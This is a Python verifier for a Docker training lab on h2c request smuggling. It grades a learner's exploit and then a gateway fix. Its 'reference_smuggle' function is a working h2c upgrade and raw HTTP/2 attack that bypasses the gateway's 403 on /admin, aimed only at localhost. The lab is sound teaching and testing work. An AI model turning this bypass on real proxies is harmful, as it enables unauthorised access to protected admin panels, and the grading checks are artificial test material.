#!/usr/bin/env python3
"""
verify/verify.py — Verifier otomatis 2 fase untuk lab h2c-smuggling.

Hanya memakai Python stdlib (tanpa dependency), butuh `docker compose` di host.

Alur:
  FASE 1 (pristine): bangun lab dari definisi rentan, pastikan
      - baseline GET /                       -> 200 halaman publik
      - GET /admin langsung                  -> 403 (ACL gateway jalan)
      - serangan referensi (health)          -> smuggling h2c ke /admin
        mengembalikan 200 + konten panel admin (lab terbukti rentan;
        kalau ini gagal, yang rusak lab-nya, bukan learner)
      - exploit/exploit.py milik learner dijalankan -> mencetak STATUS: 200
        + SMUGGLED_PATH, dan smuggling ulang ke SMUGGLED_PATH oleh
        verifier benar-benar mengembalikan 200 + konten admin
  FASE 2 (dengan fix/): bangun ulang gateway dari fix/gateway, pastikan
      - serangan referensi GAGAL             -> smuggling ke /admin tidak
        lagi menghasilkan 200 + konten admin
      - baseline GET /                       -> 200 (fungsi normal utuh)
      - GET /admin langsung                  -> 403 (ACL tidak dirusak fix)

Deteksi scaffold (tanpa string TODO di file learner):
  - exploit: skrip scaffold me-raise NotImplementedError -> exit 3.
  - fix: isi fix/gateway/proxy.py identik byte-per-byte dengan
    gateway/proxy.py (pristine) -> exit 2.

Exit code: 0 = kedua fase lulus, 1 = gagal, 2 = fase 2 belum dikerjakan,
           3 = fase 1 belum dikerjakan (exploit.py belum ada/belum diisi).
"""
import os
import re
import shutil
import socket
import struct
import subprocess
import sys
import time

LAB_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOST, PORT = "127.0.0.1", 8080

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
MARKER = b"ADMIN-SECRET"

PASS, FAIL = "LULUS", "GAGAL"
results = []


def log(msg):
    print(msg, flush=True)


def check(name, ok, detail=""):
    results.append((name, ok))
    log("  [%s] %s%s" % (PASS if ok else FAIL, name, " — " + detail if detail else ""))
    return ok


def run_compose(args):
    cmd = ["docker", "compose"] + args
    p = subprocess.run(cmd, cwd=LAB_DIR, capture_output=True, text=True, timeout=600)
    if p.returncode != 0:
        log("perintah gagal: %s\n%s" % (" ".join(cmd), p.stderr[-2000:]))
        sys.exit(1)
    return p


def raw_request(method, path, headers=None, body=None):
    """Kirim raw HTTP agar request terkirim persis seperti ditulis.

    Membaca respons sampai EOF, jadi default-nya mengirim `Connection: close`
    (tanpa ini, server HTTP/1.1 keep-alive tidak menutup koneksi dan recv()
    nyangkut sampai socket timeout). Mengembalikan (status, headers, body).
    Respons kosong dilaporkan sebagai status 0 agar cek gagal dengan jelas,
    bukan traceback.
    """
    lines = ["%s %s HTTP/1.1" % (method, path), "Host: %s:%d" % (HOST, PORT)]
    hdrs = dict(headers or {})
    hdrs.setdefault("Connection", "close")
    body_bytes = b""
    if body is not None:
        body_bytes = body.encode("latin-1") if isinstance(body, str) else body
        hdrs.setdefault("Content-Length", str(len(body_bytes)))
    for k, v in hdrs.items():
        lines.append("%s: %s" % (k, v))
    req = ("\r\n".join(lines) + "\r\n\r\n").encode("latin-1") + body_bytes
    with socket.create_connection((HOST, PORT), timeout=10) as s:
        s.sendall(req)
        resp = b""
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            resp += chunk
    head, _, resp_body = resp.partition(b"\r\n\r\n")
    head_lines = head.split(b"\r\n")
    try:
        status = int(head_lines[0].split()[1])
    except (IndexError, ValueError):
        return 0, {}, b""
    hdict = {}
    for line in head_lines[1:]:
        if b":" in line:
            k, v = line.split(b":", 1)
            hdict[k.decode("latin-1").strip().lower()] = v.decode("latin-1").strip()
    return status, hdict, resp_body


def wait_up(timeout=150):
    log("menunggu lab siap di %s:%d ..." % (HOST, PORT))
    for _ in range(timeout):
        try:
            status, _, _ = raw_request("GET", "/")
            if status == 200:
                return True
        except Exception:
            pass
        time.sleep(1)
    return False


# ---------- klien HTTP/2 minimal (stdlib only) ----------

def h2_literal(name, value):
    nb, vb = name.encode("latin-1"), value.encode("latin-1")
    return bytes((len(nb),)) + nb + bytes((len(vb),)) + vb


def h2_send_frame(s, ftype, flags, sid, payload):
    hdr = (struct.pack(">I", len(payload))[1:] + bytes((ftype, flags))
           + struct.pack(">I", sid & 0x7FFFFFFF))
    s.sendall(hdr + payload)


def h2_recvn(s, n):
    data = b""
    while len(data) < n:
        chunk = s.recv(n - len(data))
        if not chunk:
            raise ConnectionError("eof")
        data += chunk
    return data


def h2_read_frame(s):
    hdr = h2_recvn(s, 9)
    length = int.from_bytes(hdr[0:3], "big")
    payload = h2_recvn(s, length) if length else b""
    return hdr[3], hdr[4], int.from_bytes(hdr[5:9], "big") & 0x7FFFFFFF, payload


def h2_int(data, pos, prefix):
    mask = (1 << prefix) - 1
    value = data[pos] & mask
    pos += 1
    if value < mask:
        return value, pos
    m = 0
    while True:
        b = data[pos]
        pos += 1
        value += (b & 127) << m
        m += 7
        if not (b & 128):
            break
    return value, pos


def h2_parse_headers(payload):
    fields = {}
    pos, n = 0, len(payload)
    while pos < n:
        b0 = payload[pos]
        if b0 & 0x80:
            break
        if b0 & 0x40:
            prefix = 6
        elif (b0 & 0xF0) == 0x00:
            prefix = 4
        else:
            break
        name_len, pos = h2_int(payload, pos, prefix)
        name = payload[pos:pos + name_len].decode("latin-1")
        pos += name_len
        if payload[pos] & 0x80:
            break
        value_len, pos = h2_int(payload, pos, 7)
        value = payload[pos:pos + value_len].decode("latin-1")
        pos += value_len
        fields[name] = value
    return fields


def reference_smuggle(path):
    """Serangan referensi: upgrade h2c lalu selundupkan request ke `path`.

    Mengembalikan (status, body) dari request yang diselundupkan, atau
    (None, b"") kalau smuggling gagal di langkah mana pun.
    Saat lab rentan dan path=/admin: (200, body berisi MARKER).
    """
    s = None
    try:
        s = socket.create_connection((HOST, PORT), timeout=10)
        req = ("GET / HTTP/1.1\r\nHost: %s:%d\r\n"
               "Connection: Upgrade, HTTP2-Settings\r\n"
               "Upgrade: h2c\r\nHTTP2-Settings: \r\n\r\n") % (HOST, PORT)
        s.sendall(req.encode("latin-1"))
        head = b""
        while b"\r\n\r\n" not in head:
            chunk = s.recv(65536)
            if not chunk:
                return None, b""
            head += chunk
            if len(head) > 1 << 20:
                return None, b""
        if not head.startswith(b"HTTP/1.1 101"):
            return None, b""
        s.sendall(PREFACE)
        h2_send_frame(s, 0x4, 0x0, 0, b"")
        hp = b"".join([
            h2_literal(":method", "GET"),
            h2_literal(":scheme", "http"),
            h2_literal(":path", path),
            h2_literal(":authority", "%s:%d" % (HOST, PORT)),
        ])
        h2_send_frame(s, 0x1, 0x4 | 0x1, 1, hp)
        status, body = None, b""
        deadline = time.time() + 10
        while time.time() < deadline:
            s.settimeout(max(0.1, deadline - time.time()))
            try:
                ftype, flags, sid, payload = h2_read_frame(s)
            except (ConnectionError, socket.timeout):
                break
            if ftype == 0x4 and not (flags & 0x1):
                h2_send_frame(s, 0x4, 0x1, 0, b"")
            elif ftype == 0x6 and len(payload) == 8:
                h2_send_frame(s, 0x6, 0x1, 0, payload)
            elif ftype == 0x1 and sid == 1:
                fields = h2_parse_headers(payload)
                if ":status" in fields:
                    try:
                        status = int(fields[":status"])
                    except ValueError:
                        pass
            elif ftype == 0x0 and sid == 1:
                body += payload
                if flags & 0x1:
                    break
        return status, body
    except Exception:
        return None, b""
    finally:
        if s is not None:
            try:
                s.close()
            except OSError:
                pass


def parse_exploit_output(out):
    m_status = re.search(r"^STATUS:\s*(\d{3})\s*$", out, re.MULTILINE)
    m_path = re.search(r"^SMUGGLED_PATH:\s*(\S+)\s*$", out, re.MULTILINE)
    return (m_status.group(1) if m_status else None,
            m_path.group(1) if m_path else None)


def main():
    if shutil.which("docker") is None:
        log("docker tidak ditemukan di PATH. Install Docker dulu lalu jalankan lagi.")
        sys.exit(1)

    # ---- bersih-bersih dulu ----
    log("== bersih-bersih container lama ==")
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "down", "--remove-orphans"])
    run_compose(["down", "--remove-orphans"])

    # ---- FASE 1: pristine harus rentan ----
    log("== FASE 1: membangun lab PRISTINE (rentan) ==")
    run_compose(["up", "--build", "-d"])
    if not wait_up():
        log("lab tidak merespons — cek `docker compose logs`.")
        sys.exit(1)

    log("-- cek fase 1 --")
    s_pub, _, _ = raw_request("GET", "/")
    check("halaman publik / hidup (200)", s_pub == 200, "dapat %d" % s_pub)
    s_adm, _, _ = raw_request("GET", "/admin")
    check("request langsung /admin diblokir gateway (403)", s_adm == 403,
          "dapat %d" % s_adm)

    # Health check: lab harus rentan terhadap smuggling referensi.
    # Kalau ini gagal, yang rusak adalah lab/setup-nya — bukan learner.
    s_ref, body_ref = reference_smuggle("/admin")
    ref_ok = (s_ref == 200 and MARKER in body_ref)
    check("lab dalam kondisi rentan (smuggling h2c ke /admin -> 200 + konten admin)",
          ref_ok, "dapat status=%s, marker=%s" % (s_ref, MARKER in body_ref))
    if not ref_ok:
        log("\nFase 1 GAGAL: lab tidak dalam kondisi rentan. Periksa setup Docker.")
        sys.exit(1)

    # Artefak learner: exploit/exploit.py harus ada dan sudah diisi.
    # Scaffold me-raise NotImplementedError — itu penanda "belum dikerjakan".
    exploit_py = os.path.join(LAB_DIR, "exploit", "exploit.py")
    if not os.path.exists(exploit_py):
        log("FASE 1: exploit/exploit.py belum ada — kerjakan fase 1 dulu "
            "(tulis exploit-mu di sana; lihat exploit/README.md).")
        sys.exit(3)

    # Jalankan exploit milik learner. Kontrak: skrip mencetak dua baris —
    #   STATUS: <kode>            status HTTP dari request yang diselundupkan
    #   SMUGGLED_PATH: <path>     path yang diselundupkan skrip itu sendiri
    # Verifier lalu memverifikasi sendiri: smuggling ulang ke SMUGGLED_PATH
    # harus 200 + memuat konten panel admin.
    log("menjalankan exploit/exploit.py milik learner ...")
    try:
        p = subprocess.run([sys.executable, exploit_py],
                           capture_output=True, text=True, timeout=60,
                           cwd=LAB_DIR)
    except subprocess.TimeoutExpired:
        log("FASE 1 GAGAL: exploit/exploit.py melebihi 60 detik (hang?).")
        sys.exit(1)
    out = (p.stdout or "") + "\n" + (p.stderr or "")
    if "NotImplementedError" in out:
        log("FASE 1: exploit/exploit.py masih scaffold (belum diedit) — "
            "kerjakan fase 1 dulu.")
        sys.exit(3)
    got_status, got_path = parse_exploit_output(out)
    ok1 = False
    detail = ""
    if not (got_status and got_path):
        detail = ("baris kontrak tak lengkap (STATUS=%s, SMUGGLED_PATH=%s)"
                  % (got_status, got_path))
    elif not got_path.startswith("/admin"):
        detail = "SMUGGLED_PATH harus di bawah /admin (itu yang diblokir 403)"
    else:
        s_v, body_v = reference_smuggle(got_path)
        ok1 = (got_status == "200" and s_v == 200 and MARKER in body_v)
        detail = ("klaim STATUS=%s, verifikasi ulang: status=%s, marker=%s"
                  % (got_status, s_v, MARKER in body_v))
    ok1 = check("exploit learner menembus proteksi /admin via terowongan h2c",
                ok1, detail)
    if p.returncode != 0:
        log("  (catatan: script exit code %d)" % p.returncode)
    if not ok1:
        tail = out.strip().splitlines()[-8:]
        if tail:
            log("  output script (maks 8 baris terakhir):")
            for line in tail:
                log("    " + line)
        log("\nFase 1 GAGAL: exploit-mu belum membuktikan H2C smuggling. "
            "Lihat exploit/README.md.")
        sys.exit(1)
    log("FASE 1: LULUS — exploit learner reproducible dan berhasil.\n")

    # ---- FASE 2: fix harus ada dan benar ----
    # Scaffold fix = salinan pristine; file yang identik byte-per-byte dengan
    # pristine berarti belum dikerjakan.
    pristine = os.path.join(LAB_DIR, "gateway", "proxy.py")
    fixed = os.path.join(LAB_DIR, "fix", "gateway", "proxy.py")
    if not os.path.exists(fixed):
        log("FASE 2: fix/gateway/proxy.py belum ada — kerjakan fase 2 dulu.")
        sys.exit(2)
    with open(pristine, "rb") as f:
        pristine_bytes = f.read()
    with open(fixed, "rb") as f:
        fixed_bytes = f.read()
    if pristine_bytes == fixed_bytes:
        log("FASE 2: fix/gateway/proxy.py masih identik dengan pristine (belum diedit) — "
            "kerjakan fase 2 dulu.")
        sys.exit(2)

    log("== FASE 2: membangun lab dengan FIX ==")
    # --force-recreate: gateway dibuat ulang dalam keadaan segar. Tanpa ini,
    # container gateway dari fase 1 dipakai lagi (masih menjalankan kode rentan).
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "up", "--build", "--force-recreate", "-d"])
    if not wait_up():
        log("lab (fix) tidak merespons — cek `docker compose logs`.")
        sys.exit(1)

    log("-- cek fase 2 --")
    ok = True
    s_x, body_x = reference_smuggle("/admin")
    atk_gagal = not (s_x == 200 and MARKER in body_x)
    ok &= check("serangan H2C smuggling GAGAL (tidak lagi 200 + konten admin)",
                atk_gagal, "dapat status=%s, marker=%s" % (s_x, MARKER in body_x))

    s_pub, _, _ = raw_request("GET", "/")
    ok &= check("halaman publik / tetap hidup (200)", s_pub == 200,
                "dapat %d" % s_pub)

    s_adm, _, _ = raw_request("GET", "/admin")
    ok &= check("proteksi /admin tetap jalan (langsung -> 403)", s_adm == 403,
                "dapat %d" % s_adm)

    log("")
    if ok:
        log("FASE 2: LULUS — fix menutup serangan tanpa merusak fungsi normal.")
        log("\n=== LAB SELESAI: kedua fase LULUS ===")
        log("Stack (dengan fix) masih berjalan di http://localhost:8080.")
        log("./lab.sh stop  -> hentikan | ./lab.sh start -> kembali ke kondisi rentan")
        sys.exit(0)
    else:
        log("FASE 2: GAGAL — perbaiki fix-mu lalu jalankan verify lagi.")
        sys.exit(1)


if __name__ == "__main__":
    main()
